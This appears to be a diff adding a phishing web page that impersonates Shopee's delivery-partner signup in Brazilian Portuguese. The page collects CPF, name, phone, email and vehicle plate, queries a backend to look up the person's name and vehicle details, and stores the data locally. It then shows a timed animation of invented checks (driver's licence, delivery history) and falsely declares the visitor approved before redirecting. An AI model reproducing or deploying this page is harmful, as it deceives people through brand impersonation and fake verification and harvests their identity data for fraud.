@@ -1,0 +1,821 @@
+﻿<!DOCTYPE html><html lang="pt-BR"><head>
+<script src="../../scripts/utms/latest-5.js" data-utmify-prevent-xcod-sck="" data-utmify-prevent-subids="" async="" defer=""></script>
+<script>
+  window.pixelId = "6831e7bd3fe783e25540d199";
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+  document.head.appendChild(a);
+</script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+    <title> Shopee Delivery Partners - Cadastro</title>
+    <link rel="stylesheet" href="css/all.min.css">
+    <link href="../../css2-3?family=Roboto:wght@400;500;700&family=Poppins:wght@400;700&display=swap" rel="stylesheet">
+    <script src="../../3.4-3.16"></script>
+    <style>
+        body {
+            font-family: 'Poppins', sans-serif;
+        }
+        .bg-shopee {
+            background-color: #EE4D2D;
+        }
+        .text-shopee {
+            color: #EE4D2D;
+        }
+        .border-shopee {
+            border-color: #EE4D2D;
+        }
+        .hover-bg-shopee:hover {
+            background-color: #d73920;
+        }
+        
+        .btn-primary {
+            background-color: #E83D22;
+            color: #fff;
+            font-weight: 500;
+            height: 50px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            border-radius: 3px;
+            transition: background-color 0.3s;
+        }
+        
+        .btn-primary:hover {
+            background-color: #d73920;
+            color: #fff;
+        }
+        
+        .btn-primary:disabled {
+            background-color: rgb(255, 149, 128);
+            cursor: not-allowed;
+            color: #fff;
+        }
+        
+        .status-item {
+            transition: all 0.3s ease;
+            opacity: 0.5;
+            transform: translateY(10px);
+        }
+        .status-item.active {
+            opacity: 1;
+            transform: translateY(0);
+        }
+        .status-item.active .status-icon {
+            background-color: #E83D22;
+            color: white;
+        }
+        .status-item.active .status-text {
+            color: #111827;
+            font-weight: bold;
+        }
+        
+        @keyframes bounce {
+            0%, 80%, 100% { transform: scale(0); }
+            40% { transform: scale(1.0); }
+        }
+        
+        .loading-dot {
+            animation: bounce 1.4s infinite ease-in-out both;
+        }
+        
+        .loading-dot:nth-child(1) {
+            animation-delay: -0.32s;
+        }
+        
+        .loading-dot:nth-child(2) {
+            animation-delay: -0.16s;
+        }
+    </style>
+</head>
+<body class="bg-white min-h-screen flex flex-col">
+    
+    <header class="bg-white shadow-md">
+        <div class="container mx-auto px-4 py-4 flex items-center justify-between">
+            <a href="index.html">
+                <img src="images/057b274c134bcf92ac151758478949b3.jpg" alt="Shopee Logo" class="h-8 cursor-pointer">
+            </a>
+            <div class="hamburger-menu cursor-pointer">
+                <div class="w-[16px] h-[3px] bg-[#2d3562] my-1 transition-all duration-400"></div>
+                <div class="w-[20px] h-[3px] bg-[#2d3562] my-1 transition-all duration-400"></div>
+                <div class="w-[24px] h-[3px] bg-[#2d3562] my-1 transition-all duration-400"></div>
+            </div>
+        </div>
+    </header>
+    
+    
+    <div class="w-full bg-[#ee4e2e] py-1 px-6 flex items-center">
+      <div class="flex items-center">
+        <div class="mr-3">
+          <span style="
+              color: #fff;
+              font-size: 28px;
+              font-weight: 900;
+              display: inline-block;
+              -webkit-text-stroke: 2px #fff;
+            ">
+            >
+          </span>
+        </div>
+        <div class="leading-none">
+          <h1 class="text-base font-bold" style="color: #fff">
+            Motorista Parceiro
+          </h1>
+          <p class="text-sm mt-0" style="transform: translateY(-2px); color: #fff">
+            Shopee
+          </p>
+        </div>
+      </div>
+    </div>
+    
+    <div class="flex-grow container mx-auto px-2 py-8 w-full">
+        <div class="w-full mx-auto p-6 mb-8">
+            <h1 class="text-3xl font-bold text-center mb-8 text-gray-800">Cadastro de Entregador Parceiro</h1>
+            
+            <form id="cadastroForm" class="space-y-6">
+                <div class="space-y-4">
+                    <div>
+                        <label for="cpf" class="block text-base font-medium text-gray-800 mb-2">
+                            CPF
+                        </label>
+                        <div class="relative">
+                            <input id="cpf" name="cpf" type="text" placeholder="000.000.000-00" class="w-full px-3 py-2 border border-gray-300 rounded-md shadow-sm focus:outline-none focus:ring-[#E83D22] focus:border-[#E83D22]" inputmode="numeric">
+                            <div id="loadingCpf" class="absolute right-3 top-1/2 transform -translate-y-1/2 hidden">
+                                <div class="animate-spin h-4 w-4 border-2 border-[#E83D22] border-t-transparent rounded-full"></div>
+                            </div>
+                        </div>
+                        <p id="cpfError" class="mt-1 text-sm text-red-600 hidden"></p>
+                    </div>
+
+                    <div>
+                        <label for="nome" class="block text-base font-medium text-gray-800 mb-2">
+                            Nome Completo
+                        </label>
+                        <input id="nome" name="nome" type="text" placeholder="Digite seu nome completo" class="w-full px-3 py-2 border border-gray-300 rounded-md shadow-sm focus:outline-none focus:ring-[#E83D22] focus:border-[#E83D22]">
+                        <p id="nomeError" class="mt-1 text-sm text-red-600 hidden"></p>
+                    </div>
+
+                    <div>
+                        <label for="telefone" class="block text-base font-medium text-gray-800 mb-2">
+                            Telefone
+                        </label>
+                        <input id="telefone" name="telefone" type="text" placeholder="(00) 00000-0000" class="w-full px-3 py-2 border border-gray-300 rounded-md shadow-sm focus:outline-none focus:ring-[#E83D22] focus:border-[#E83D22]" inputmode="numeric">
+                        <p id="telefoneError" class="mt-1 text-sm text-red-600 hidden"></p>
+                    </div>
+
+                    <div>
+                        <label for="email" class="block text-base font-medium text-gray-800 mb-2">
+                            E-mail
+                        </label>
+                        <input id="email" name="email" type="email" placeholder="seu@email.com" class="w-full px-3 py-2 border border-gray-300 rounded-md shadow-sm focus:outline-none focus:ring-[#E83D22] focus:border-[#E83D22]">
+                        <p id="emailError" class="mt-1 text-sm text-red-600 hidden"></p>
+                    </div>
+
+                    <div class="pt-4">
+                        <label class="block text-lg font-medium text-gray-800 mb-4">
+                            Qual veículo você utiliza?
+                        </label>
+                        <div class="grid grid-cols-2 gap-4">
+                            <button type="button" id="btnCarro" class="flex flex-col items-center justify-center p-6 border-2 border-gray-200 bg-white hover:bg-gray-50 rounded-lg transition-colors" onclick="selecionarVeiculo('carro')">
+                                <div class="mb-3 h-24 flex items-center justify-center">
+                                    <img src="images/carro-shopee.png" alt="Carros Shopee" class="h-full w-auto object-contain">
+                                </div>
+                                <span class="font-medium text-gray-700">
+                                    Carro
+                                </span>
+                            </button>
+                            
+                            <button type="button" id="btnMoto" class="flex flex-col items-center justify-center p-6 border-2 border-gray-200 bg-white hover:bg-gray-50 rounded-lg transition-colors" onclick="selecionarVeiculo('moto')">
+                                <div class="mb-3 h-20 flex items-center justify-center">
+                                    <img src="images/moto-shopee.png" alt="Moto Shopee" class="h-full object-contain">
+                                </div>
+                                <span class="font-medium text-gray-700">
+                                    Moto
+                                </span>
+                            </button>
+                        </div>
+                    </div>
+
+                    <div class="pt-2">
+                        
+                        <div class="p-4 mb-6 bg-[#fff8f6] border border-[#E83D22] rounded-md">
+                            <h3 class="font-medium text-[#E83D22] mb-2">Opção para Veículo Alugado</h3>
+                            <p class="text-gray-700 text-sm mb-3">
+                                Se você trabalha com um veículo alugado ou emprestado, selecione esta opção 
+                                para prosseguir sem a necessidade de informar a placa do veículo.
+                            </p>
+                            <div class="flex items-center">
+                                <input id="isRentedCar" type="checkbox" class="w-5 h-5 text-[#E83D22] rounded border-gray-300 focus:ring-[#E83D22]" onchange="toggleRentedCar()">
+                                <label for="isRentedCar" class="ml-2 text-base font-bold text-[#E83D22] leading-tight">
+                                    Estou utilizando um veículo alugado ou emprestado
+                                </label>
+                            </div>
+                        </div>
+
+                        
+                        <div id="placaContainer">
+                            <label for="placa" class="block text-base font-medium text-gray-800 mb-2">
+                                Placa do Veículo
+                            </label>
+                            <div class="relative">
+                                <input id="placa" name="placa" placeholder="ABC-1234 ou ABC1D23" class="w-full px-3 py-2 border border-gray-300 rounded-md shadow-sm focus:outline-none focus:ring-[#E83D22] focus:border-[#E83D22]" inputmode="text" type="search" autocapitalize="characters">
+                                <div id="loadingPlaca" class="absolute right-3 top-1/2 transform -translate-y-1/2 hidden">
+                                    <div class="animate-spin h-4 w-4 border-2 border-[#E83D22] border-t-transparent rounded-full"></div>
+                                </div>
+                            </div>
+                            <p id="placaError" class="mt-1 text-sm text-red-600 hidden"></p>
+                        </div>
+                        
+                        
+                        <div id="vehicleInfoContainer" class="mt-3">
+                            <div class="flex justify-between items-start mb-2">
+                                <h3 class="font-medium text-gray-800">Informações do Veículo</h3>
+                                <button type="button" id="btnClearPlate" class="text-xs px-2 py-1 bg-red-50 text-red-600 rounded hover:bg-red-100 transition-colors hidden" onclick="handleClearPlate()">
+                                    NÃO É MEU VEÍCULO
+                                </button>
+                            </div>
+                            
+                            <div id="vehicleInfoBox" class="p-4 border rounded-md bg-gray-50 text-gray-500">
+                                Insira a placa do veículo para consultar informações
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <button type="submit" class="w-full bg-[#ee4d2d] text-white font-medium py-3 text-base rounded-[3px] flex items-center justify-center" style="height: 50px;">
+                    Prosseguir
+                </button>
+            </form>
+        </div>
+    </div>
+    
+    
+    <div id="loadingModal" class="fixed inset-0 z-50 overflow-y-auto bg-black bg-opacity-60 hidden">
+        <div class="flex min-h-screen items-center justify-center p-4">
+            <div class="relative mx-auto max-w-md w-full h-full max-h-screen overflow-hidden border-none shadow-none bg-white">
+                <div class="absolute top-0 left-0 w-full h-full bg-white z-0"></div>
+                
+                <div class="relative flex flex-col justify-center items-center h-screen bg-transparent z-10">
+                    
+                    <div class="flex space-x-2 mb-8 fixed top-1/4">
+                        <div class="loading-dot w-3 h-3 bg-[#E83D22] rounded-full"></div>
+                        <div class="loading-dot w-3 h-3 bg-[#E83D22] rounded-full" style="animation-delay: 150ms;"></div>
+                        <div class="loading-dot w-3 h-3 bg-[#E83D22] rounded-full" style="animation-delay: 300ms;"></div>
+                    </div>
+                    
+                    
+                    <div class="w-11/12 max-w-md mt-48">
+                        <h2 class="font-semibold text-lg text-center mb-6" id="loadingTitle">Verificando Cadastro</h2>
+
+                        <div class="space-y-3" id="loadingStepsContainer">
+                            
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    
+    
+    <footer class="bg-[#ee4d2d] text-white py-10 mt-auto">
+        <div class="container mx-auto px-4">
+            <div class="flex flex-col md:flex-row justify-between items-center">
+                <div class="mb-6 md:mb-0">
+                    <img src="images/057b274c134bcf92ac151758478949b3.jpg" alt="Shopee Logo" class="h-10 mb-2 mx-auto md:mx-0 bg-white p-1 rounded">
+                    <p class="text-sm text-center md:text-left">© 2024  Shopee. Todos os direitos reservados.</p>
+                </div>
+                
+                <div class="text-center md:text-right">
+                    <p class="text-sm opacity-80 mb-2">Programa de Parceiros Entregadores  Shopee</p>
+                    <p class="text-xs opacity-70">Trabalhe conosco e faça parte da nossa equipe de entregas</p>
+                </div>
+            </div>
+        </div>
+    </footer>
+
+    <script>
+    document.addEventListener('DOMContentLoaded', function() {
+        let tipoVeiculo = null;
+        let isRentedCar = false;
+        let vehicleIsValid = false;
+        let loadingSteps = [
+            "Verificando dados do CPF",
+            "Consultando Carteira de Motorista",
+            "Validando documentação do veículo",
+            "Analisando disponibilidade na região",
+            "Verificando histórico de entregas"
+        ];
+
+        
+        
+        const cpfInput = document.getElementById('cpf');
+        cpfInput.addEventListener('input', function(e) {
+            let value = e.target.value.replace(/\D/g, '');
+            let formatted = '';
+            
+            if (value.length <= 3) {
+                formatted = value;
+            } else if (value.length <= 6) {
+                formatted = `${value.slice(0, 3)}.${value.slice(3)}`;
+            } else if (value.length <= 9) {
+                formatted = `${value.slice(0, 3)}.${value.slice(3, 6)}.${value.slice(6)}`;
+            } else {
+                formatted = `${value.slice(0, 3)}.${value.slice(3, 6)}.${value.slice(6, 9)}-${value.slice(9, 11)}`;
+            }
+            
+            e.target.value = formatted;
+        });
+
+        
+        cpfInput.addEventListener('blur', function() {
+            const cpf = this.value;
+            if (cpf.replace(/\D/g, '').length === 11) {
+                consultarCPF(cpf);
+            }
+        });
+
+        
+        document.getElementById('telefone').addEventListener('input', function(e) {
+            let value = e.target.value.replace(/\D/g, '');
+            let formatted = '';
+            
+            if (value.length <= 2) {
+                formatted = value;
+            } else if (value.length <= 6) {
+                formatted = `(${value.slice(0, 2)}) ${value.slice(2)}`;
+            } else if (value.length <= 10) {
+                formatted = `(${value.slice(0, 2)}) ${value.slice(2, 6)}-${value.slice(6)}`;
+            } else {
+                formatted = `(${value.slice(0, 2)}) ${value.slice(2, 7)}-${value.slice(7)}`;
+            }
+            
+            e.target.value = formatted;
+        });
+
+        
+        function consultarCPF(cpf) {
+            const loadingCpf = document.getElementById('loadingCpf');
+            loadingCpf.classList.remove('hidden');
+            
+            const formData = new FormData();
+            formData.append('action', 'consultarCPF');
+            formData.append('cpf', cpf);
+            
+            fetch('cadastro.php', {
+                method: 'POST',
+                body: formData,
+                headers: {
+                    'X-Requested-With': 'XMLHttpRequest'
+                }
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.success) {
+                    const nomeInput = document.getElementById('nome');
+                    if (!nomeInput.value && data.data.NOME) {
+                        nomeInput.value = data.data.NOME;
+                    }
+                } else {
+                    console.error('Erro ao consultar CPF:', data.error);
+                }
+            })
+            .catch(error => {
+                console.error('Erro na requisição:', error);
+            })
+            .finally(() => {
+                loadingCpf.classList.add('hidden');
+            });
+        }
+
+        
+        const placaInput = document.getElementById('placa');
+        placaInput.addEventListener('blur', function() {
+            const placa = this.value.trim().toUpperCase();
+            if (placa.length >= 7) {
+                consultarPlaca(placa);
+            }
+        });
+
+        
+        placaInput.addEventListener('input', function() {
+            let value = this.value.toUpperCase();
+            this.value = value;
+            
+            
+            document.getElementById('btnClearPlate').classList.add('hidden');
+            document.getElementById('vehicleInfoBox').innerHTML = 'Insira a placa do veículo para consultar informações';
+            vehicleIsValid = false;
+        });
+
+        
+        function consultarPlaca(placa) {
+            
+            placa = placa.replace(/[^A-Z0-9]/g, '');
+            
+            
+            if (!/^[A-Z]{3}[0-9][A-Z0-9][0-9]{2}$/.test(placa) && !/^[A-Z]{3}[0-9]{4}$/.test(placa)) {
+                document.getElementById('placaError').textContent = "Formato de placa inválido";
+                document.getElementById('placaError').classList.remove('hidden');
+                return;
+            }
+            
+            
+            document.getElementById('placaError').classList.add('hidden');
+            
+            
+            document.getElementById('loadingPlaca').classList.remove('hidden');
+            
+            const formData = new FormData();
+            formData.append('action', 'consultarPlaca');
+            formData.append('placa', placa);
+            
+            fetch('cadastro.php', {
+                method: 'POST',
+                body: formData,
+                headers: {
+                    'X-Requested-With': 'XMLHttpRequest'
+                }
+            })
+            .then(response => response.json())
+            .then(result => {
+                if (result.success) {
+                    const vehicleData = result.data;
+                    updateVehicleInfo(vehicleData);
+                    vehicleIsValid = true;
+                } else {
+                    
+                    showManualVehicleInput(placa);
+                    console.error('Erro ao consultar placa:', result.error);
+                }
+            })
+            .catch(error => {
+                
+                showManualVehicleInput(placa);
+                console.error('Erro na requisição:', error);
+            })
+            .finally(() => {
+                
+                document.getElementById('loadingPlaca').classList.add('hidden');
+            });
+        }
+
+        
+        function updateVehicleInfo(vehicleData) {
+            const vehicleInfoBox = document.getElementById('vehicleInfoBox');
+            vehicleInfoBox.innerHTML = `
+                <h3 class="font-medium text-gray-800 mb-2">Informações do Veículo</h3>
+                <div class="grid grid-cols-2 gap-x-4 gap-y-2 text-sm">
+                    <div>
+                        <span class="font-medium text-gray-600">Marca:</span>
+                        <span class="ml-1 text-gray-800">${vehicleData.marca || 'N/A'}</span>
+                    </div>
+                    <div>
+                        <span class="font-medium text-gray-600">Modelo:</span>
+                        <span class="ml-1 text-gray-800">${vehicleData.modelo || 'N/A'}</span>
+                    </div>
+                    <div>
+                        <span class="font-medium text-gray-600">Ano:</span>
+                        <span class="ml-1 text-gray-800">${vehicleData.ano || 'N/A'}</span>
+                    </div>
+                    <div>
+                        <span class="font-medium text-gray-600">Cor:</span>
+                        <span class="ml-1 text-gray-800">${vehicleData.cor || 'N/A'}</span>
+                    </div>
+                    <div class="col-span-2">
+                        <span class="font-medium text-gray-600">Chassi:</span>
+                        <span class="ml-1 text-gray-800">${vehicleData.chassi || (vehicleData.extra?.chassi ? vehicleData.extra.chassi.substring(0, 5) + '*****' : 'N/A')}</span>
+                    </div>
+                </div>
+            `;
+            
+            document.getElementById('btnClearPlate').classList.remove('hidden');
+        }
+
+        
+        function showManualVehicleInput(placa) {
+            const vehicleInfoBox = document.getElementById('vehicleInfoBox');
+            vehicleInfoBox.innerHTML = `
+                <h3 class="font-medium text-gray-800 mb-2">Informações do Veículo</h3>
+                <p class="text-sm text-amber-600 mb-2">Não foi possível consultar a placa automaticamente. Por favor, informe os dados do veículo:</p>
+                <div class="grid grid-cols-1 sm:grid-cols-2 gap-3">
+                    <div>
+                        <label class="block text-xs font-medium text-gray-700 mb-1">Marca:</label>
+                        <input type="text" id="marcaVeiculo" class="w-full px-2 py-1 text-sm border border-gray-300 rounded focus:ring-1 focus:ring-[#E83D22] focus:border-[#E83D22]">
+                    </div>
+                    <div>
+                        <label class="block text-xs font-medium text-gray-700 mb-1">Modelo:</label>
+                        <input type="text" id="modeloVeiculo" class="w-full px-2 py-1 text-sm border border-gray-300 rounded focus:ring-1 focus:ring-[#E83D22] focus:border-[#E83D22]">
+                    </div>
+                    <div>
+                        <label class="block text-xs font-medium text-gray-700 mb-1">Ano:</label>
+                        <input type="text" id="anoVeiculo" class="w-full px-2 py-1 text-sm border border-gray-300 rounded focus:ring-1 focus:ring-[#E83D22] focus:border-[#E83D22]">
+                    </div>
+                    <div>
+                        <label class="block text-xs font-medium text-gray-700 mb-1">Cor:</label>
+                        <input type="text" id="corVeiculo" class="w-full px-2 py-1 text-sm border border-gray-300 rounded focus:ring-1 focus:ring-[#E83D22] focus:border-[#E83D22]">
+                    </div>
+                </div>
+                <button type="button" id="btnSaveVehicle" class="mt-3 w-full bg-[#E83D22] text-white text-sm font-medium py-2 rounded">
+                    Confirmar dados do veículo
+                </button>
+            `;
+            
+            document.getElementById('btnClearPlate').classList.remove('hidden');
+            
+            
+            document.getElementById('btnSaveVehicle').addEventListener('click', function() {
+                const marca = document.getElementById('marcaVeiculo').value;
+                const modelo = document.getElementById('modeloVeiculo').value;
+                const ano = document.getElementById('anoVeiculo').value;
+                const cor = document.getElementById('corVeiculo').value;
+                
+                if (marca && modelo) {
+                    const vehicleData = {
+                        marca: marca,
+                        modelo: modelo,
+                        ano: ano,
+                        cor: cor,
+                        placa: placa
+                    };
+                    
+                    updateVehicleInfo(vehicleData);
+                    vehicleIsValid = true;
+                } else {
+                    alert('Por favor, preencha pelo menos a marca e o modelo do veículo.');
+                }
+            });
+        }
+
+        
+        window.selecionarVeiculo = function(tipo) {
+            tipoVeiculo = tipo;
+            
+            const btnCarro = document.getElementById('btnCarro');
+            const btnMoto = document.getElementById('btnMoto');
+            
+            if (tipo === 'carro') {
+                btnCarro.classList.add('border-[#E83D22]', 'border-3', 'bg-[#FFF8F6]');
+                btnCarro.classList.remove('border-gray-200', 'border-2', 'bg-white', 'hover:bg-gray-50');
+                btnCarro.querySelector('span').classList.add('text-[#E83D22]');
+                btnCarro.querySelector('span').classList.remove('text-gray-700');
+                
+                btnMoto.classList.remove('border-[#E83D22]', 'border-3', 'bg-[#FFF8F6]');
+                btnMoto.classList.add('border-gray-200', 'border-2', 'bg-white', 'hover:bg-gray-50');
+                btnMoto.querySelector('span').classList.remove('text-[#E83D22]');
+                btnMoto.querySelector('span').classList.add('text-gray-700');
+            } else {
+                btnMoto.classList.add('border-[#E83D22]', 'border-3', 'bg-[#FFF8F6]');
+                btnMoto.classList.remove('border-gray-200', 'border-2', 'bg-white', 'hover:bg-gray-50');
+                btnMoto.querySelector('span').classList.add('text-[#E83D22]');
+                btnMoto.querySelector('span').classList.remove('text-gray-700');
+                
+                btnCarro.classList.remove('border-[#E83D22]', 'border-3', 'bg-[#FFF8F6]');
+                btnCarro.classList.add('border-gray-200', 'border-2', 'bg-white', 'hover:bg-gray-50');
+                btnCarro.querySelector('span').classList.remove('text-[#E83D22]');
+                btnCarro.querySelector('span').classList.add('text-gray-700');
+            }
+        };
+
+        
+        window.toggleRentedCar = function() {
+            isRentedCar = document.getElementById('isRentedCar').checked;
+            
+            const placaContainer = document.getElementById('placaContainer');
+            const vehicleInfoContainer = document.getElementById('vehicleInfoContainer');
+            
+            if (isRentedCar) {
+                placaContainer.style.display = 'none';
+                vehicleInfoContainer.style.display = 'none';
+                vehicleIsValid = true; 
+            } else {
+                placaContainer.style.display = 'block';
+                vehicleInfoContainer.style.display = 'block';
+                vehicleIsValid = false; 
+            }
+        };
+
+        
+        window.handleClearPlate = function() {
+            document.getElementById('placa').value = '';
+            document.getElementById('vehicleInfoBox').innerHTML = 'Insira a placa do veículo para consultar informações';
+            document.getElementById('btnClearPlate').classList.add('hidden');
+            vehicleIsValid = false;
+        };
+
+        
+        const validateForm = () => {
+            let isValid = true;
+            
+            
+            const cpf = document.getElementById('cpf').value;
+            if (!cpf || cpf.replace(/\D/g, '').length !== 11) {
+                document.getElementById('cpfError').textContent = "CPF inválido";
+                document.getElementById('cpfError').classList.remove('hidden');
+                isValid = false;
+            } else {
+                document.getElementById('cpfError').classList.add('hidden');
+            }
+            
+            
+            const nome = document.getElementById('nome').value;
+            if (!nome || nome.length < 3) {
+                document.getElementById('nomeError').textContent = "Nome deve ter pelo menos 3 caracteres";
+                document.getElementById('nomeError').classList.remove('hidden');
+                isValid = false;
+            } else {
+                document.getElementById('nomeError').classList.add('hidden');
+            }
+            
+            
+            const telefone = document.getElementById('telefone').value;
+            if (!telefone || telefone.replace(/\D/g, '').length < 10) {
+                document.getElementById('telefoneError').textContent = "Telefone inválido";
+                document.getElementById('telefoneError').classList.remove('hidden');
+                isValid = false;
+            } else {
+                document.getElementById('telefoneError').classList.add('hidden');
+            }
+            
+            
+            const email = document.getElementById('email').value;
+            if (!email || !email.includes('@') || !email.includes('.')) {
+                document.getElementById('emailError').textContent = "Email inválido";
+                document.getElementById('emailError').classList.remove('hidden');
+                isValid = false;
+            } else {
+                document.getElementById('emailError').classList.add('hidden');
+            }
+            
+            
+            if (!tipoVeiculo) {
+                alert("Selecione o tipo de veículo (Carro ou Moto)");
+                isValid = false;
+            }
+            
+            
+            if (!isRentedCar && !vehicleIsValid) {
+                document.getElementById('placaError').textContent = "Por favor, insira uma placa válida ou selecione a opção 'Carro alugado'";
+                document.getElementById('placaError').classList.remove('hidden');
+                isValid = false;
+            } else {
+                document.getElementById('placaError').classList.add('hidden');
+            }
+            
+            return isValid;
+        };
+
+        document.getElementById('cadastroForm').addEventListener('submit', function(e) {
+    e.preventDefault();
+    
+    document.getElementById('cpfError').classList.add('hidden');
+    document.getElementById('nomeError').classList.add('hidden');
+    document.getElementById('telefoneError').classList.add('hidden');
+    document.getElementById('emailError').classList.add('hidden');
+    document.getElementById('placaError').classList.add('hidden');
+    
+    if (validateForm()) {
+        let vehicleData = null;
+        if (!isRentedCar) {
+            const marcaInput = document.getElementById('marcaVeiculo');
+            if (marcaInput) {
+                vehicleData = {
+                    marca: marcaInput.value,
+                    modelo: document.getElementById('modeloVeiculo').value,
+                    ano: document.getElementById('anoVeiculo').value,
+                    cor: document.getElementById('corVeiculo').value,
+                    placa: document.getElementById('placa').value
+                };
+            }
+        }
+        
+        const cepData = localStorage.getItem('shopee_delivery_cep_data') ? JSON.parse(localStorage.getItem('shopee_delivery_cep_data')) : {};
+        
+        const formData = {
+            cpf: document.getElementById('cpf').value,
+            nome: document.getElementById('nome').value,
+            telefone: document.getElementById('telefone').value,
+            email: document.getElementById('email').value,
+            tipoVeiculo: tipoVeiculo,
+            placa: isRentedCar ? null : document.getElementById('placa').value,
+            isRentedCar: isRentedCar,
+            vehicleData: vehicleData,
+            estado: cepData.state || '',
+            cidade: cepData.city || ''
+        };
+        
+        localStorage.setItem('candidato_data', JSON.stringify(formData));
+        
+        localStorage.setItem('user_data', JSON.stringify({
+            nome: formData.nome,
+            cpf: formData.cpf,
+            email: formData.email,
+            telefone: formData.telefone
+        }));
+        
+        showLoadingModal();
+    }
+});
+
+        
+        function showLoadingModal() {
+            const modal = document.getElementById('loadingModal');
+            const stepsContainer = document.getElementById('loadingStepsContainer');
+            
+            
+            stepsContainer.innerHTML = '';
+            
+            
+            const firstStep = document.createElement('div');
+            firstStep.className = 'status-item flex items-center p-2 bg-gray-100 rounded-lg active';
+            firstStep.innerHTML = `
+                <div class="status-icon bg-[#E83D22] text-white rounded-full w-8 h-8 flex items-center justify-center mr-3">
+                    <span class="text-sm">1</span>
+                </div>
+                <div class="status-text text-gray-900 text-sm font-medium">
+                    ${loadingSteps[0]}
+                </div>
+            `;
+            stepsContainer.appendChild(firstStep);
+            
+            
+            for (let i = 1; i < loadingSteps.length; i++) {
+                const step = document.createElement('div');
+                step.className = 'status-item flex items-center p-2 bg-gray-100 rounded-lg';
+                step.innerHTML = `
+                    <div class="status-icon bg-gray-300 text-white rounded-full w-8 h-8 flex items-center justify-center mr-3">
+                        <span class="text-sm">${i + 1}</span>
+                    </div>
+                    <div class="status-text text-gray-600 text-sm">
+                        ${loadingSteps[i]}
+                    </div>
+                `;
+                stepsContainer.appendChild(step);
+            }
+            
+            
+            modal.classList.remove('hidden');
+            
+            
+            let currentStep = 0;
+            
+            function animateNextStep() {
+                if (currentStep < loadingSteps.length - 1) {
+                    currentStep++;
+                    
+                    const steps = document.querySelectorAll('.status-item');
+                    
+                    const prevStepIcon = steps[currentStep - 1].querySelector('.status-icon');
+                    prevStepIcon.innerHTML = `<i class="fas fa-check text-sm"></i>`;
+                    
+                    
+                    steps[currentStep].classList.add('active');
+                    const icon = steps[currentStep].querySelector('.status-icon');
+                    const text = steps[currentStep].querySelector('.status-text');
+                    
+                    icon.classList.remove('bg-gray-300');
+                    icon.classList.add('bg-[#E83D22]');
+                    text.classList.remove('text-gray-600');
+                    text.classList.add('text-gray-900', 'font-medium');
+                    
+                    setTimeout(() => {
+                        if (currentStep < loadingSteps.length - 1) {
+                            animateNextStep();
+                        } else {
+                            
+                            setTimeout(() => {
+                                const successMessage = document.createElement('div');
+                                successMessage.className = 'mt-6 p-4 bg-green-100 rounded-lg border border-green-200';
+                                successMessage.innerHTML = `
+                                    <div class="flex items-center justify-center mb-2">
+                                        <div class="bg-green-500 text-white rounded-full p-1">
+                                            <svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="3" d="M5 13l4 4L19 7" />
+                                            </svg>
+                                        </div>
+                                    </div>
+                                    <div class="text-center text-green-700 font-medium">
+                                        Seus dados foram validados com sucesso! Você está apto a ser um Entregador Parceiro  Shopee.
+                                    </div>
+                                `;
+                                stepsContainer.appendChild(successMessage);
+                                
+                                
+                                setTimeout(() => {
+                                    window.location.href = '/entregador/municipios';
+                                }, 2000);
+                            }, 1000);
+                        }
+                    }, 1400); 
+                }
+            }
+            
+            
+            setTimeout(animateNextStep, 1500);
+        }
+    });
+    </script>
+	<script src="js/latest.js" data-utmify-prevent-subids="" async="" defer=""></script>
+
+</body></html>
